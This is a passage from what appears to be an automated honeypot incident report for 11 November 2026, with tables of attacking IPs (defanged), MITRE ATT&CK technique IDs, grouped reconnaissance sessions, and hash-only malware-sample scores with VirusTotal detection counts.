| IR-a1c3b5f332e8 | HIGH | `103.88.76[.]27` | 2026-11-11 06:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-81e4f9799c66 | HIGH | `103.88.76[.]27` | 2026-11-11 06:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-39450d7cde6d | HIGH | `109.160.32[.]131` | 2026-11-11 06:51 | Y | 1 | 0 | `T1078 · T1592` |
| IR-d3fa331db227 | HIGH | `172.236.228[.]111` | 2026-11-11 06:54 | Y | 3 | 0 | `T1078` |
| IR-2973c2a2f00b | HIGH | `196.50.29[.]16` | 2026-11-11 06:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c929cfbf73ab | HIGH | `196.50.29[.]16` | 2026-11-11 06:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-09db42b86689 | HIGH | `186.96.158[.]180` | 2026-11-11 07:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8aab2241fcf4 | HIGH | `186.96.158[.]180` | 2026-11-11 07:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-564b2c1a06d0 | HIGH | `199.165.159[.]9` | 2026-11-11 07:25 | Y | 3 | 0 | `T1078` |
| IR-4583a469d652 | HIGH | `92.118.39[.]49` | 2026-11-11 07:53 | Y | 27 | 0 | `T1059.004 · T1078 · T1592` |
| IR-38a5e04f3638 | HIGH | `92.118.39[.]49` | 2026-11-11 07:57 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-67ef4ca27903 | HIGH | `109.160.32[.]131` | 2026-11-11 08:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-fb7520c5612c | HIGH | `92.118.39[.]49` | 2026-11-11 08:01 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-48e6c2afbd34 | HIGH | `92.118.39[.]49` | 2026-11-11 08:05 | Y | 27 | 0 | `T1059.004 · T1078 · T1592` |
| IR-746b4afc5191 | HIGH | `92.118.39[.]49` | 2026-11-11 08:12 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-a74f938d5038 | HIGH | `109.160.32[.]167` | 2026-11-11 08:30 | Y | 1 | 0 | `T1078 · T1592` |
| IR-0814493c9d27 | HIGH | `92.118.39[.]49` | 2026-11-11 08:30 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c771d13bfb13 | HIGH | `92.118.39[.]49` | 2026-11-11 08:33 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-155b59631777 | HIGH | `92.118.39[.]49` | 2026-11-11 08:35 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-81b6372bfbc1 | HIGH | `92.118.39[.]49` | 2026-11-11 08:37 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4bcc695dad4a | HIGH | `109.160.32[.]151` | 2026-11-11 08:38 | Y | 1 | 0 | `T1078 · T1592` |
| IR-fed78e837b42 | HIGH | `92.118.39[.]49` | 2026-11-11 08:42 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8835edd09c19 | HIGH | `172.236.228[.]39` | 2026-11-11 08:42 | Y | 3 | 0 | `T1078` |
| IR-a44d78644cb8 | HIGH | `92.118.39[.]49` | 2026-11-11 08:43 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-a5fa36f30600 | HIGH | `92.118.39[.]49` | 2026-11-11 08:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e0836215122d | HIGH | `92.118.39[.]49` | 2026-11-11 08:46 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-df54ac667081 | HIGH | `92.118.39[.]49` | 2026-11-11 08:47 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-39c26e1c5973 | HIGH | `92.118.39[.]49` | 2026-11-11 08:48 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-de0cd2ec8819 | HIGH | `92.118.39[.]49` | 2026-11-11 08:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-fc1973e31692 | HIGH | `92.118.39[.]49` | 2026-11-11 08:50 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-86bbad22e9e7 | HIGH | `92.118.39[.]49` | 2026-11-11 08:51 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-766fe33dde56 | HIGH | `92.118.39[.]49` | 2026-11-11 08:52 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-304f3643e9e9 | HIGH | `92.118.39[.]49` | 2026-11-11 08:54 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1ae361fd22fc | HIGH | `92.118.39[.]49` | 2026-11-11 08:55 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5d7808d65979 | HIGH | `85.155.14[.]245` | 2026-11-11 08:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c928e20e506d | HIGH | `92.118.39[.]49` | 2026-11-11 08:56 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c4f73cf2bfa6 | HIGH | `92.118.39[.]49` | 2026-11-11 08:58 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d3902ed6d140 | HIGH | `92.118.39[.]49` | 2026-11-11 08:59 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8c4ab39363eb | HIGH | `176.53.159[.]196` | 2026-11-11 08:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6e0adda8a904 | HIGH | `92.118.39[.]49` | 2026-11-11 09:00 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-197eb0fd016e | HIGH | `92.118.39[.]49` | 2026-11-11 09:01 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8b0a049671c1 | HIGH | `92.118.39[.]49` | 2026-11-11 09:02 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-972ac0afa94c | HIGH | `92.118.39[.]49` | 2026-11-11 09:03 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-363a7c5f366c | HIGH | `92.118.39[.]49` | 2026-11-11 09:04 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-282733659cdb | HIGH | `92.118.39[.]49` | 2026-11-11 09:05 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-18b8fcf92172 | HIGH | `92.118.39[.]49` | 2026-11-11 09:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c48719a893e9 | HIGH | `92.118.39[.]49` | 2026-11-11 09:07 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b337fea0cf3a | HIGH | `92.118.39[.]49` | 2026-11-11 09:08 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-573a0a3dc5aa | HIGH | `92.118.39[.]49` | 2026-11-11 09:09 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-2975a8587795 | HIGH | `92.118.39[.]49` | 2026-11-11 09:10 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f5431ce9cfe2 | HIGH | `92.118.39[.]49` | 2026-11-11 09:12 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3edd1556383f | HIGH | `103.102.46[.]200` | 2026-11-11 09:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-66ad83381dd6 | HIGH | `192.253.248[.]223` | 2026-11-11 09:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6c1adeece684 | HIGH | `91.186.216[.]80` | 2026-11-11 09:31 | Y | 0 | 0 | `T1078` |
| IR-c24e97a2f85d | HIGH | `165.154.11[.]64` | 2026-11-11 09:45 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-48f66bb44788 | HIGH | `109.160.32[.]167` | 2026-11-11 10:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e0f95cca8fd4 | HIGH | `50.47.143[.]233` | 2026-11-11 10:02 | Y | 9 | 0 | `T1057 · T1078 · T1083` |
| IR-4b6f8f1c4744 | HIGH | `176.53.159[.]196` | 2026-11-11 10:02 | Y | 0 | 0 | `T1078 · T1592` |
_… 102 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `137.184.169[.]96` | **4** | 2026-11-11 11:50 | 2026-11-11 16:03 | 4m | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | **3** | 2026-11-11 03:17 | 2026-11-11 06:30 | 2m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]131` | **2** | 2026-11-11 06:50 | 2026-11-11 08:08 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]138` | **2** | 2026-11-11 05:09 | 2026-11-11 06:48 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]43` | **2** | 2026-11-11 14:39 | 2026-11-11 16:15 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-11 03:28 | 2026-11-11 04:09 | 3m | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | **2** | 2026-11-11 09:08 | 2026-11-11 10:01 | 1m | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | **2** | 2026-11-11 03:56 | 2026-11-11 04:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | **2** | 2026-11-11 15:42 | 2026-11-11 16:09 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]49` | **2** | 2026-11-11 07:45 | 2026-11-11 08:40 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]49` | **2** | 2026-11-11 13:24 | 2026-11-11 14:43 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `1.212.225[.]99` | 1 | 2026-11-11 03:07 | 2026-11-11 03:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `102.179.129[.]146` | 1 | 2026-11-11 11:13 | 2026-11-11 11:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `102.216.219[.]24` | 1 | 2026-11-11 08:35 | 2026-11-11 08:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.159.2[.]113` | 1 | 2026-11-11 06:10 | 2026-11-11 06:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-11-11 14:53 | 2026-11-11 14:53 | 5s | 0 | `T1592` | 🟢 LOW |
| `103.59.177[.]48` | 1 | 2026-11-11 13:56 | 2026-11-11 13:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]151` | 1 | 2026-11-11 08:37 | 2026-11-11 08:37 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]167` | 1 | 2026-11-11 08:29 | 2026-11-11 08:29 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]44` | 1 | 2026-11-11 10:26 | 2026-11-11 10:27 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]48` | 1 | 2026-11-11 02:58 | 2026-11-11 02:58 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.183.178[.]83` | 1 | 2026-11-11 18:03 | 2026-11-11 18:03 | 21s | 0 | `T1592` | 🟢 LOW |
| `122.97.137[.]2` | 1 | 2026-11-11 04:58 | 2026-11-11 04:58 | 11s | 0 | `T1592` | 🟢 LOW |
| `123.13.88[.]23` | 1 | 2026-11-11 09:25 | 2026-11-11 09:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `128.185.33[.]241` | 1 | 2026-11-11 09:28 | 2026-11-11 09:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `134.209.232[.]191` | 1 | 2026-11-11 06:06 | 2026-11-11 06:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-11 06:14 | 2026-11-11 06:14 | 32s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-11 09:10 | 2026-11-11 09:11 | 59s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-11 18:03 | 2026-11-11 18:04 | 41s | 0 | `T1592` | 🟢 LOW |
| `149.78.37[.]133` | 1 | 2026-11-11 14:43 | 2026-11-11 14:43 | 11s | 0 | `T1592` | 🟢 LOW |
| `164.90.219[.]112` | 1 | 2026-11-11 06:08 | 2026-11-11 06:08 | 20s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-11 12:02 | 2026-11-11 12:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `165.22.85[.]220` | 1 | 2026-11-11 06:08 | 2026-11-11 06:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.245.242[.]242` | 1 | 2026-11-11 06:08 | 2026-11-11 06:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.50.67[.]115` | 1 | 2026-11-11 03:09 | 2026-11-11 03:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.231.237[.]214` | 1 | 2026-11-11 17:51 | 2026-11-11 17:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.83.55[.]158` | 1 | 2026-11-11 16:21 | 2026-11-11 16:22 | 34s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]111` | 1 | 2026-11-11 06:54 | 2026-11-11 06:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]39` | 1 | 2026-11-11 08:42 | 2026-11-11 08:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.116.141[.]94` | 1 | 2026-11-11 10:35 | 2026-11-11 10:35 | 14s | 0 | `T1592` | 🟢 LOW |
| `177.207.250[.]1` | 1 | 2026-11-11 05:55 | 2026-11-11 05:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `177.86.215[.]46` | 1 | 2026-11-11 04:59 | 2026-11-11 04:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-11 07:27 | 2026-11-11 07:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-11 17:59 | 2026-11-11 17:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.97.26[.]82` | 1 | 2026-11-11 06:17 | 2026-11-11 06:17 | 5s | 0 | `T1592` | 🟢 LOW |
| `180.157.11[.]85` | 1 | 2026-11-11 18:34 | 2026-11-11 18:35 | 12s | 0 | `T1592` | 🟢 LOW |
| `180.93.193[.]100` | 1 | 2026-11-11 15:51 | 2026-11-11 15:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.27.52[.]99` | 1 | 2026-11-11 07:33 | 2026-11-11 07:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `184.105.247[.]254` | 1 | 2026-11-11 11:44 | 2026-11-11 11:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.191.236[.]38` | 1 | 2026-11-11 03:33 | 2026-11-11 03:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `187.190.189[.]118` | 1 | 2026-11-11 13:41 | 2026-11-11 13:41 | 13s | 0 | `T1592` | 🟢 LOW |
| `189.5.218[.]5` | 1 | 2026-11-11 03:42 | 2026-11-11 03:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-11-11 08:47 | 2026-11-11 08:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-11 10:12 | 2026-11-11 10:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-11 12:38 | 2026-11-11 12:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-11 17:48 | 2026-11-11 17:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.158.26[.]59` | 1 | 2026-11-11 09:33 | 2026-11-11 09:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.211.253[.]172` | 1 | 2026-11-11 14:42 | 2026-11-11 14:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]202` | 1 | 2026-11-11 15:47 | 2026-11-11 15:47 | 1s | 0 | `T1592` | 🟢 LOW |
| `198.163.193[.]128` | 1 | 2026-11-11 05:47 | 2026-11-11 05:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `198.98.58[.]199` | 1 | 2026-11-11 15:36 | 2026-11-11 15:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.36.238[.]38` | 1 | 2026-11-11 08:55 | 2026-11-11 08:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.65.169[.]105` | 1 | 2026-11-11 16:31 | 2026-11-11 16:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.65.217[.]249` | 1 | 2026-11-11 06:31 | 2026-11-11 06:31 | 10s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]43` | 1 | 2026-11-11 15:26 | 2026-11-11 15:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]53` | 1 | 2026-11-11 15:26 | 2026-11-11 15:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `208.96.233[.]67` | 1 | 2026-11-11 09:15 | 2026-11-11 09:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]195` | 1 | 2026-11-11 15:02 | 2026-11-11 15:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.122.115[.]9` | 1 | 2026-11-11 10:10 | 2026-11-11 10:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.224.231[.]243` | 1 | 2026-11-11 15:53 | 2026-11-11 15:54 | 12s | 0 | `T1592` | 🟢 LOW |
| `222.90.233[.]165` | 1 | 2026-11-11 04:06 | 2026-11-11 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `23.132.164[.]185` | 1 | 2026-11-11 03:21 | 2026-11-11 03:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `23.94.194[.]173` | 1 | 2026-11-11 18:18 | 2026-11-11 18:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-11-11 09:04 | 2026-11-11 09:04 | 9s | 0 | `T1592` | 🟢 LOW |
| `31.128.251[.]105` | 1 | 2026-11-11 12:04 | 2026-11-11 12:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.206.151[.]215` | 1 | 2026-11-11 10:55 | 2026-11-11 10:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.122[.]180` | 1 | 2026-11-11 10:43 | 2026-11-11 10:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.136[.]244` | 1 | 2026-11-11 06:12 | 2026-11-11 06:12 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.210.198[.]246` | 1 | 2026-11-11 04:33 | 2026-11-11 04:33 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.210.216[.]203` | 1 | 2026-11-11 11:19 | 2026-11-11 11:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.22[.]77` | 1 | 2026-11-11 04:34 | 2026-11-11 04:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `38.110.46[.]236` | 1 | 2026-11-11 18:19 | 2026-11-11 18:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `38.110.46[.]238` | 1 | 2026-11-11 15:16 | 2026-11-11 15:17 | 60s | 0 | `T1592` | 🟢 LOW |
| `38.211.32[.]162` | 1 | 2026-11-11 17:12 | 2026-11-11 17:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `39.191.29[.]160` | 1 | 2026-11-11 12:03 | 2026-11-11 12:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `40.74.211[.]225` | 1 | 2026-11-11 06:29 | 2026-11-11 06:29 | 10s | 0 | `T1592` | 🟢 LOW |
| `40.76.96[.]137` | 1 | 2026-11-11 16:16 | 2026-11-11 16:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-11-11 07:06 | 2026-11-11 07:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-11-11 16:07 | 2026-11-11 16:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]183` | 1 | 2026-11-11 16:45 | 2026-11-11 16:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.182.219[.]128` | 1 | 2026-11-11 12:13 | 2026-11-11 12:13 | 35s | 0 | `T1592` | 🟢 LOW |
| `45.186.209[.]206` | 1 | 2026-11-11 16:34 | 2026-11-11 16:35 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-11-11 15:36 | 2026-11-11 15:36 | 6s | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]104` | 1 | 2026-11-11 05:38 | 2026-11-11 05:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-11-11 08:39 | 2026-11-11 08:39 | 5s | 0 | `T1592` | 🟢 LOW |
| `46.22.224[.]48` | 1 | 2026-11-11 04:00 | 2026-11-11 04:00 | 13s | 0 | `T1592` | 🟢 LOW |
| `46.8.62[.]27` | 1 | 2026-11-11 05:22 | 2026-11-11 05:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `5.32.244[.]115` | 1 | 2026-11-11 12:33 | 2026-11-11 12:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.199.81[.]66` | 1 | 2026-11-11 09:29 | 2026-11-11 09:29 | 11s | 0 | `T1592` | 🟢 LOW |
| `58.250.117[.]205` | 1 | 2026-11-11 03:14 | 2026-11-11 03:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.37.13[.]66` | 1 | 2026-11-11 11:58 | 2026-11-11 11:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.227.90[.]185` | 1 | 2026-11-11 17:39 | 2026-11-11 17:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]197` | 1 | 2026-11-11 03:53 | 2026-11-11 03:53 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-11 07:55 | 2026-11-11 07:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]212` | 1 | 2026-11-11 09:18 | 2026-11-11 09:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]126` | 1 | 2026-11-11 04:39 | 2026-11-11 04:39 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]81` | 1 | 2026-11-11 13:32 | 2026-11-11 13:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]185` | 1 | 2026-11-11 13:31 | 2026-11-11 13:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]191` | 1 | 2026-11-11 08:08 | 2026-11-11 08:08 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]214` | 1 | 2026-11-11 13:32 | 2026-11-11 13:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]161` | 1 | 2026-11-11 13:31 | 2026-11-11 13:31 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]195` | 1 | 2026-11-11 04:40 | 2026-11-11 04:40 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]197` | 1 | 2026-11-11 13:32 | 2026-11-11 13:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]194` | 1 | 2026-11-11 03:38 | 2026-11-11 03:38 | 7s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]57` | 1 | 2026-11-11 04:39 | 2026-11-11 04:39 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.228.43[.]149` | 1 | 2026-11-11 03:37 | 2026-11-11 03:37 | 31s | 0 | `T1592` | 🟢 LOW |
| `66.228.43[.]149` | 1 | 2026-11-11 07:37 | 2026-11-11 07:38 | 32s | 0 | `T1592` | 🟢 LOW |
| `66.228.43[.]149` | 1 | 2026-11-11 11:38 | 2026-11-11 11:38 | 31s | 0 | `T1592` | 🟢 LOW |
| `66.228.43[.]149` | 1 | 2026-11-11 15:38 | 2026-11-11 15:38 | 32s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-11-11 18:52 | 2026-11-11 18:52 | 8s | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]186` | 1 | 2026-11-11 13:27 | 2026-11-11 13:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `76.187.24[.]32` | 1 | 2026-11-11 15:03 | 2026-11-11 15:03 | 13s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-11 11:04 | 2026-11-11 11:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-11 14:31 | 2026-11-11 14:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.52.209[.]193` | 1 | 2026-11-11 05:54 | 2026-11-11 05:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-11 05:57 | 2026-11-11 05:58 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-11 10:24 | 2026-11-11 10:25 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-11 14:53 | 2026-11-11 14:53 | 6s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | 1 | 2026-11-11 04:28 | 2026-11-11 04:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-11-11 02:58 | 2026-11-11 02:58 | 11s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `82.67.72[.]220` | 1 | 2026-11-11 15:58 | 2026-11-11 15:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]0` | 1 | 2026-11-11 07:49 | 2026-11-11 07:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]5` | 1 | 2026-11-11 15:56 | 2026-11-11 15:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]226` | 1 | 2026-11-11 07:58 | 2026-11-11 07:58 | 2s | 0 | `T1592` | 🟢 LOW |
| `94.26.106[.]220` | 1 | 2026-11-11 10:24 | 2026-11-11 10:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `96.1.40[.]151` | 1 | 2026-11-11 03:19 | 2026-11-11 03:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `99.101.71[.]213` | 1 | 2026-11-11 10:20 | 2026-11-11 10:20 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
